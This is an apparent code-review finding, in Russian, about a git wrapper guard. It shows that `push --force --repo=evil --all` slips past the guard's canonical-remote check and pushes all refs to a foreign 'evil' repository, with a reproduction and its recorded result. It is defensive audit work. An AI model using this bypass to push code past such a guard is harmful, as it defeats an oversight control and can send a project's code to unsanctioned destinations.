## Блокер: `push --repo=evil --all` исполняет обмен с чужой целью

Текущий `scripts/gitw` разбирает после подкоманды только позиционную цель: любой токен `-*` он пропускает без разбора его семантики и arity. У `git push` есть опция `--repo <repository>`; форма `--repo=evil` задаёт фактический repository, а `--all` задаёт refspec без позиционного аргумента. Поэтому обёртка не видит `evil`, выбирает и успешно проверяет канонический `origin`, делает `ls-remote` канона и затем прозрачно `exec`-ит исходный argv. Настоящий git отправляет refs в `evil`.

Живая независимая проба проведена только в disposable-клоне `/tmp/dev-harness-verify/045-confirm`, с локальными bare `canonical.git` и `evil.git`; сеть и основной чекаут не использовались. У жертвы `origin=canonical.git`, именованный `evil=evil.git`, а tip жертвы был отличен от tip чужого bare. Команда:

```text
GIT_EXCHANGE_GUARD_CANONICAL=<canonical.git> scripts/gitw -C <victim> push --force --repo=evil --all
```

вернула rc 0 и переместила `evil.git/refs/heads/main` ровно на SHA tip жертвы:

```text
BYPASS --repo=evil push: rc=0 foreign-main=a086c827515558ab26b404ed98ced133afedfa7d
```

Это реальный обмен с неканонической целью, а не только успешный код: SHA чужого bare после команды равен SHA отправителя. Нарушены И-4/И-5/И-6 и требование судить каждую форму цели до исполнения. Текущая батарея г0–г16 проверяет positional URL/remote/SCP, но не option-based repository у `push`; она остаётся зелёной против этой реализации и потому не закрывает данный обход.

Нужны исправление разбора repository-опций `push` до суждения и красная клетка с отдельным неканоническим bare: канонический origin + `push --force --repo=evil --all` обязаны дать F1 и не изменить чужой ref. Судить нужно фактическую `--repo`-цель, а не по умолчанию `origin`.
